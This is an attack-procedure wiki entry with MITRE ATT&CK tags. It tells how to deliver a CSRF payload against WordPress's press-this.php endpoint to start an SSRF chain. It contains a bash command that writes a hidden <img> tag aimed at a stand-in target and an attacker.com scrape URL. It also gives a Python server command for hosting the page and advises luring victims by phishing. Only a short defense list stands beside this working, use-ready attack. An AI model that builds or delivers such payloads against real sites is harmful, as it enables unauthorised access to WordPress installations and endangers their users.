---
id: proc-deliver-csrf-payload-187520
tags:
  - csrf
  - drive-by
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/create-csrf-html-payload]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:31:30.710Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Deliver-CSRF-Payload-via-Malicious-HTML

## Summary

This procedure crafts and delivers a malicious HTML page using an <img> tag to forge a CSRF request to WordPress's Press This endpoint, initiating the SSRF chain without user interaction beyond loading the page.

## Description

The attack targets the lack of CSRF protection in wp-admin/press-this.php, using a GET request disguised as an image load to submit parameters like u= (URL to scrape) and url-scan-submit=Scan. When loaded, the victim's browser sends the request with session cookies, causing the WordPress server to scrape from the attacker's controlled domain. This sets up the redirect for SSRF. Prerequisites include hosting the HTML on an attacker domain and luring the victim (e.g., via email link).

## Requirements

1. Control of a domain/server to host the HTML
2. Victim's active session on target WordPress
3. Basic web server (e.g., Apache, nginx, or Python HTTP server)

## Defense

Defensive measures and detection strategies:

- Enforce CSRF tokens on all state-changing endpoints
- Validate referrer headers for admin actions
- Block or scan for suspicious <img> src patterns in client-side requests

## Objectives

1. Forge request to Press This without user awareness
2. Trigger server-side scrape from attacker domain
3. Maintain stealth via passive HTML load

## Instructions

### Step 1: Create Malicious HTML

**Context**: Generate HTML with <img> tag targeting the CSRF-vulnerable endpoint.

**Command** ([[commands/create-csrf-html-payload]]):
```bash
cat > malicious.html << EOF
<!DOCTYPE html><html><body><img src="//target.com/wp-admin/press-this.php?u=http://attacker.com&url-scan-submit=Scan" style="display:none;"></body></html>
EOF
```

> Creates a hidden img tag that triggers the GET request on load. Expected output: HTML file ready for serving.

### Step 2: Host and Lure Victim

**Context**: Serve the HTML and deliver via phishing or compromised site.

**Command** ([[commands/host-malicious-html]]):
```bash
python3 -m http.server 80 --directory .
```

> Starts a simple server; share http://attacker.com/malicious.html with victim. Expected output: Page loads and img src triggers request.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Drive-by Compromise]] Drive-by Compromise

### Sub-Techniques

- None

## Commands Used

- [[commands/create-csrf-html-payload]]
- [[commands/host-malicious-html]]

## Tools Used

- None

## Tags

- [[csrf]]
- [[drive-by]]
